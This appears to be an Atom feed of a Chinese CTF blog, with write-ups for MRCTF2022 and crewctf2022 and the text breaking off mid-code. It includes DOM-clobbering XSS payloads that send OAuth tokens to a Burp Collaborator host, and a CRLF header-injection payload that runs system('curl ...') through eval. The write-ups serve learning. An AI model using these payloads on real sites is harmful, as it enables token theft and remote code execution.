<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ue0cean&#39;s   blog</title>
  
  <subtitle>welcome to my world -- sharing CTF &amp; ML skills</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-27T16:42:31.991Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>b1ue0cean</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MRCTF2022</title>
    <link href="http://example.com/2022/04/27/MRCTF2022/"/>
    <id>http://example.com/2022/04/27/MRCTF2022/</id>
    <published>2022-04-27T07:25:37.000Z</published>
    <updated>2022-04-27T16:42:31.991Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="http://brtserver.node2.buptmerak.cn/signin">http://brtserver.node2.buptmerak.cn/signin</a></p></blockquote><p>周末没打比赛 听说有个xss  现在有空来看看</p><span id="more"></span><h1 id="God-of-GPA"><a href="#God-of-GPA" class="headerlink" title="God-of-GPA"></a>God-of-GPA</h1><p>注册一个 jackma 123</p><p>感觉这里有个xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Img</span> =  <span class="variable language_">window</span>.<span class="property">MyImg</span> || &#123;<span class="attr">src</span>: <span class="string">&#x27;https://md.buptmerak.cn/uploads/upload_d12a3804a813ffb14fe38a318d6bfcf1.png&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Container</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Container</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27;</span> + <span class="title class_">Img</span>.<span class="property">src</span> + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="title class_">Container</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Node/appendChild">https://developer.mozilla.org/zh-CN/docs/Web/API/Node/appendChild</a></p><p>我们能不能动 <code>window.MyImg</code> ?  动的话是不是可以形成 dom xss</p><p>这个 <code>window.MyImg</code> 怎么动</p><p>想起了以前看过的dom clobbering</p><p>学一下 dom clobbering</p><p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p><p>可以看到这题和教学里的示范很相似</p><p>接着读了读 zeddyu 大佬的文章</p><p><a href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/">https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</a></p><p>下面直接把 portswigger上的相关介绍拉了下来</p><h2 id="How-to-exploit-DOM-clobbering-vulnerabilities"><a href="#How-to-exploit-DOM-clobbering-vulnerabilities" class="headerlink" title="How to exploit DOM-clobbering vulnerabilities"></a>How to exploit DOM-clobbering vulnerabilities</h2><p>A common pattern used by JavaScript developers is:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var someObject = window.someObject || &#123;&#125;;</span><br></pre></td></tr></table></figure><p>If you can control some of the HTML on the page, you can clobber the <code>someObject</code> reference with a DOM node, such as an anchor. Consider the following code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> someObject = <span class="variable language_">window</span>.<span class="property">someObject</span> || &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="property">src</span> = someObject.<span class="property">url</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>To exploit this vulnerable code, you could inject the following HTML to clobber the <code>someObject</code> reference with an anchor element:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span> <span class="attr">name</span>=<span class="string">url</span> <span class="attr">href</span>=<span class="string">//malicious-website.com/evil.js</span>&gt;</span></span><br></pre></td></tr></table></figure><p>As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the <code>someObject</code> reference with this DOM collection. A <code>name</code> attribute is used on the last anchor element in order to clobber the <code>url</code> property of the <code>someObject</code> object, which points to an external script.</p><p>相信看到这里大家都知道这题大概该怎么去打了</p><p>我在本地构造了如下的payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;666&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Img</span> =  <span class="variable language_">window</span>.<span class="property">MyImg</span> || &#123;<span class="attr">src</span>: <span class="string">&#x27;https://md.buptmerak.cn/uploads/upload_d12a3804a813ffb14fe38a318d6bfcf1.png&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> <span class="title class_">Container</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Container</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27;</span> + <span class="title class_">Img</span>.<span class="property">src</span> + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="title class_">Container</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">src</span>=<span class="string">&quot;file:///E:/js/666&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功的进行了更改</p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;cid:<span class="symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来要考虑一下怎么拿flag</p><p>我们现在可以进行xss  我们发现网站是使用的oauth认证的</p><p>F12看了一下</p><p>cookie中存的貌似是token  想办法拿到？</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">s:</span><span class="keyword">LSr</span>-HmP6ei-vlHd6bhypbfVcy-tcuf1u.E0UpQsNSFuW+jDPhGUxC845rhVCZKjeLYW2wtr7vq4Y</span><br></pre></td></tr></table></figure><p>或者说直接让admin去点GPA再发到我的服务器上 然后xsleak出来可以吗？</p><p>接着我发现了  认证时会请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/oauth/</span>authorize?redirect_uri=http:<span class="regexp">//</span>brtclient.node2.buptmerak.cn<span class="regexp">/login HTTP/</span><span class="number">1.1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login?token=TCHa62XCtDG7DmjKG4w2KSj1paWaZ1aX</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>然后会带token登录</p><p>我尝试一下能不能拿到自己的token</p><p>发现直接填我的vps会出现 <code>redirect_uri unmatched</code>  emmmm…</p><p>怎么解决呢加个 <code>/login</code> ?</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/oauth/</span>authorize?redirect_uri=https:<span class="regexp">//</span><span class="number">0</span>abcw6idy8id19y0dsddg11ycpig65.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>好像还是不行？我想到了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/oauth/</span>authorize?redirect_uri=http:<span class="regexp">//</span>brtclient.node2.buptmerak.cn<span class="regexp">/login&amp;redirect_uri=http:/</span><span class="regexp">/0abcw6idy8id19y0dsddg11ycpig65.burpcollaborator.net/</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>md 报错了。。。</p><p>想个办法绕一下</p><p><a href="https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect">https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect</a></p><p>那能不能导到他自己的网页上再写一个xss?</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;cid:<span class="symbol">&amp;quot;</span>onerror=window.location=&#x27;http://0abcw6idy8id19y0dsddg11ycpig65.burpcollaborator.net&#x27;+window.location.search.substring(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个是跳转的页面（上面的payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>brtserver.node2.buptmerak.cn<span class="regexp">/oauth/</span>authorize?redirect_uri=http:<span class="regexp">//</span>brtclient.node2.buptmerak.cn<span class="regexp">/view/</span><span class="number">85</span>d7da5b-b8a2-<span class="number">4734</span>-<span class="number">95</span>cb-<span class="number">6</span>e654f77ab61</span><br></pre></td></tr></table></figure><p>再来个跳转到redirect的页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">MyImg</span> <span class="attr">name</span>=<span class="string">src</span> <span class="attr">href</span>=<span class="string">&quot;cid:<span class="symbol">&amp;quot;</span>onerror=window.location=&#x27;http://brtserver.node2.buptmerak.cn/oauth/authorize?redirect_uri=http://brtclient.node2.buptmerak.cn/view/85d7da5b-b8a2-4734-95cb-6e654f77ab61&#x27;//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/view/</span><span class="number">17</span>c8aa93-<span class="number">827</span>d-<span class="number">4</span>c47-b525-a1e1d824a003</span><br></pre></td></tr></table></figure><p>不知道为什么会报错 choa！~</p><p>尝试了一下official wp 也g了  那就没事了   思路是一模一样 2333</p><p>官方wp还有几种更好玩的玩法  </p><p><a href="https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/">https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/</a></p><p>总结一下</p><p>学到了不少的东西  感觉很不错！美滋滋</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://brtserver.node2.buptmerak.cn/signin&quot;&gt;http://brtserver.node2.buptmerak.cn/signin&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;周末没打比赛 听说有个xss  现在有空来看看&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://example.com/categories/WEB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>xss-game</title>
    <link href="http://example.com/2022/04/27/xss-game/"/>
    <id>http://example.com/2022/04/27/xss-game/</id>
    <published>2022-04-27T07:19:33.000Z</published>
    <updated>2022-04-27T07:22:34.021Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xss.pwnfunction.com/">https://xss.pwnfunction.com/</a></p><p>新开一个坑 有空玩玩</p><span id="more"></span><p><a href="https://blog.zeddyu.info/2020/02/11/xssgame/#introduction">https://blog.zeddyu.info/2020/02/11/xssgame/#introduction</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xss.pwnfunction.com/&quot;&gt;https://xss.pwnfunction.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;新开一个坑 有空玩玩&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SSTI总结</title>
    <link href="http://example.com/2022/04/25/SSTI-learn/"/>
    <id>http://example.com/2022/04/25/SSTI-learn/</id>
    <published>2022-04-25T02:01:06.000Z</published>
    <updated>2022-04-25T02:13:13.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSTI相关知识总结"><a href="#SSTI相关知识总结" class="headerlink" title="SSTI相关知识总结"></a>SSTI相关知识总结</h1><p>第一次遇到 SSTi 的题目是在去年安恒三月赛中 那也是我第一次打CTF比赛？不知不觉一年已经过去了</p><p>不同时期学习知识当然要有不同的体悟</p><p>现在重新总结一下ssti 相关知识 希望可以得到新的体悟</p><p>原理啥的这里我就不讨论了 网上介绍的一大堆</p><p>重点关注一下 payload 和 绕过</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSTI相关知识总结&quot;&gt;&lt;a href=&quot;#SSTI相关知识总结&quot; class=&quot;headerlink&quot; title=&quot;SSTI相关知识总结&quot;&gt;&lt;/a&gt;SSTI相关知识总结&lt;/h1&gt;&lt;p&gt;第一次遇到 SSTi 的题目是在去年安恒三月赛中 那也是我第一次打CTF比赛</summary>
      
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="SSTI" scheme="http://example.com/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>iframe相关知识总结</title>
    <link href="http://example.com/2022/04/22/iframe-learn/"/>
    <id>http://example.com/2022/04/22/iframe-learn/</id>
    <published>2022-04-21T16:41:00.000Z</published>
    <updated>2022-04-27T16:47:56.577Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="30db2d6ea377d5471e396c03a2bb7fa69ea05aaff8db5de8e5ae743e762f56e5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>SOME-attack</title>
    <link href="http://example.com/2022/04/20/SOME-attack/"/>
    <id>http://example.com/2022/04/20/SOME-attack/</id>
    <published>2022-04-20T15:36:27.000Z</published>
    <updated>2022-04-20T16:06:59.039Z</updated>
    
    <content type="html"><![CDATA[<p>先开一个天坑</p><span id="more"></span><p><a href="https://lightless.me/archives/same-origin-method-exection.html#_label0">https://lightless.me/archives/same-origin-method-exection.html#_label0</a></p><p><a href="https://xz.aliyun.com/t/8075">https://xz.aliyun.com/t/8075</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先开一个天坑&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>starCTF2022</title>
    <link href="http://example.com/2022/04/18/starCTF2022/"/>
    <id>http://example.com/2022/04/18/starCTF2022/</id>
    <published>2022-04-18T15:44:24.000Z</published>
    <updated>2022-04-18T15:44:24.174Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>crewctf2022</title>
    <link href="http://example.com/2022/04/18/crewctf2022/"/>
    <id>http://example.com/2022/04/18/crewctf2022/</id>
    <published>2022-04-18T15:44:14.000Z</published>
    <updated>2022-04-21T10:35:53.568Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crewctf2022"><a href="#crewctf2022" class="headerlink" title="crewctf2022"></a>crewctf2022</h1><p>难度适中的一场比赛 很好！</p><span id="more"></span><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="CuaaS"><a href="#CuaaS" class="headerlink" title="CuaaS"></a>CuaaS</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">clean_and_send</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean_and_send</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$uncleanedURL</span> = <span class="variable">$url</span>; <span class="comment">// should be not used anymore</span></span><br><span class="line"><span class="variable">$values</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);   <span class="comment">// 这里是不是会可能出问题</span></span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$values</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$host</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;host&#x27;</span>=&gt;<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$cleanerurl</span> = <span class="string">&quot;http://127.0.0.1/cleaner.php&quot;</span>;</span><br><span class="line">   <span class="variable">$stream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cleanerurl</span>, <span class="literal">true</span>, <span class="title function_ invoke__">stream_context_create</span>([<span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&quot;X-Original-URL: <span class="subst">$uncleanedURL</span>&quot;</span>,</span><br><span class="line"><span class="string">&#x27;content&#x27;</span> =&gt; <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>)</span><br><span class="line">]</span><br><span class="line">]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stream</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们能操控的只有这个data </p><p>我们想要影响 header 只有去 搞这个 <code>$uncleanedURL</code> </p><p>能不能拓展一下</p><p>类似 想一下怎么换行就ok</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com?<span class="type">name</span>=<span class="number">123</span>&amp;<span class="keyword">password</span>=<span class="number">666</span>\r\nX-Visited-<span class="keyword">Before</span>: <span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><p>查了下 貌似要用数组才行</p><p>不知道单纯的换行行不行</p><p>trytry</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/ HTTP/</span><span class="number">1.0</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6666</span></span><br><span class="line">Connection: close</span><br><span class="line">X-Original-URL: http:<span class="regexp">//</span>www.baidu.com</span><br><span class="line">X-Visited-Before:system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;img src=&#x27;https://imgur.com/x7BCUsr.png&#x27;&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;There your cleaned url: &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Thank you For Using our Service!&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryandeval</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;How many you visited us &quot;</span>;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">getallheaders</span>() <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&quot;X-Visited-Before&quot;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">tryandeval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要请求头有  <code>X-Visited-Before</code>  我们要想办法在哪自定义一个请求头</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">http://www.baidu.com?name=123\r\nX-Visited-Before:</span> `ls`;</span><br></pre></td></tr></table></figure><p>不知道为什么打不通 emmm</p><p>payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com?<span class="type">name</span>=<span class="number">123</span>\r\nX-Visited-<span class="keyword">Before</span>: <span class="keyword">system</span>(<span class="string">&#x27;curl https://t4ye9w6naqyv5q8750a2aimw1n7dv2.burpcollaborator.net&#x27;</span>);</span><br></pre></td></tr></table></figure><p>最后还要绕一个 disable fuction 我是zz</p><h3 id="Marvel-Pick"><a href="#Marvel-Pick" class="headerlink" title="Marvel Pick"></a>Marvel Pick</h3><blockquote><p>Pick your favorite character in marvel</p><p>EU mirror: <a href="http://104.155.50.189:1337/">http://104.155.50.189:1337</a></p><p>US mirrror: <a href="http://34.148.209.88:1337/">http://34.148.209.88:1337</a></p><p>Asia mirror: <a href="http://34.126.83.114:1337/">http://34.126.83.114:1337</a></p><p>Author : st4rn#0086</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> marvel = [</span><br><span class="line">            <span class="string">&#x27;spiderman&#x27;</span>, <span class="string">&#x27;ironman&#x27;</span>, <span class="string">&#x27;captainamerica&#x27;</span>, <span class="string">&#x27;nickfury&#x27;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">fetchMarvelVotesCount</span> (marvel) &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">`/api.php?character=<span class="subst">$&#123;marvel&#125;</span>`</span>)</span><br><span class="line">                .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">                .<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">const</span> vote_count_html = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">`#vote-count-<span class="subst">$&#123;marvel&#125;</span>`</span>)</span><br><span class="line">                    <span 